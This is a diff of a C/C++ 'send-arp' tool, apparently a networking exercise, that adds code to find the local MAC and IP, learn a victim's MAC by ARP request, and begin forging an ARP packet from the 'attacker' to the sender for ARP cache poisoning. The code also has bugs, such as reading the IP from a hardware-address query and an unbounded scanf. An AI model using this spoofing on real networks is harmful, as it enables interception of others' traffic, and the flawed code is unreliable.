@@ -19,34 +19,58 @@ void usage() {
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-Mac getmymac(char* dev){
-	int sock;
-	struct ifreq ifr;
-	char buf[6];
-	memset(&ifr, 0x00, sizeof(ifr));
-    strcpy(ifr.ifr_name, dev);
-
-    int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
-
-    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
-        perror("socket ");
-        return 1;
-    }
-
-    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
-        perror("ioctl ");
-        return 1;
-    }
-    mac = ifr.ifr_hwaddr.sa_data;
-	sprintf(buf,"%02x%02x%02x%02x%02x%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+Mac getmymac(struct ifreq ifr){
+	char buf[20];
+	unsigned char *mac=NULL;
+    mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
+	sprintf(buf,"%02x:%02x:%02x:%02x:%02x:%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
 	Mac mymac=Mac(buf);
-	printf("%s\n",mymac);
-    close(sock);
 	return mymac;
 }
+Ip getmyip(struct ifreq ifr){
+	char buf[20];
+	inet_ntop(AF_INET, ifr.ifr_addr.sa_data, buf,sizeof(struct sockaddr));
+	printf("%s\n",buf);
+	Ip myip=Ip(buf);
+	printf("%s\n",myip);
+	return myip;
+}
+Mac getsendermac(pcap_t* handle, Ip sip, Ip tip, Mac mmac){
+	char buf[20];
+	EthArpPacket packet;
+	const u_char* rawpacket;
 
-Mac getsendermac(Ip sip){
+	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//mac of target
+	packet.eth_.smac_ = mmac;//mac of mine
+	packet.eth_.type_ = htons(EthHdr::Arp);
 
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.smac_ = mmac;//mac of mine
+	packet.arp_.sip_ = htonl(sip);//ip of mine
+	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+	packet.arp_.tip_ = htonl(tip);//ip of target
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+	while(1){
+		struct pcap_pkthdr* header;
+		int res = pcap_next_ex(handle, &header, &rawpacket);
+		if (res == 0) continue;
+    	if (res == -1 || res == -2) {
+        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+        	exit(1);
+		}
+		memcpy(&packet,rawpacket,sizeof(EthArpPacket));
+		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==tip){
+			Mac resultmac=packet.arp_.tmac_;
+			return resultmac;
+		}
+    }
 }
 
 int main(int argc, char* argv[]) {
@@ -54,7 +78,6 @@ int main(int argc, char* argv[]) {
 		usage();
 		return -1;
 	}
-
 	char* dev = argv[1];
 	Ip senderip=Ip(argv[2]);
 	Ip targetip=Ip(argv[3]);
@@ -64,10 +87,31 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
-
 	EthArpPacket packet;
-	Mac smac=getsendermac(senderip);
-	Mac mmac=getmymac(errbuf);
+	////
+	int sock;
+	struct ifreq ifr;
+	memset(&ifr, 0x00, sizeof(ifr));
+    strcpy(ifr.ifr_name, dev);
+
+    int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
+    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
+        perror("socket ");
+
+    }
+
+    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
+        perror("ioctl ");
+        exit(1);
+    }
+	close(sock);
+	///
+	Ip myip=getmyip(ifr);
+	scanf("%s",dev);
+
+	Mac mmac=getmymac(ifr);
+	Mac smac=getsendermac(handle,myip,senderip,mmac);
+
 	packet.eth_.dmac_ = smac;//mac of sender
 	packet.eth_.smac_ = mmac;//mac of mine(attacker)
 	packet.eth_.type_ = htons(EthHdr::Arp);
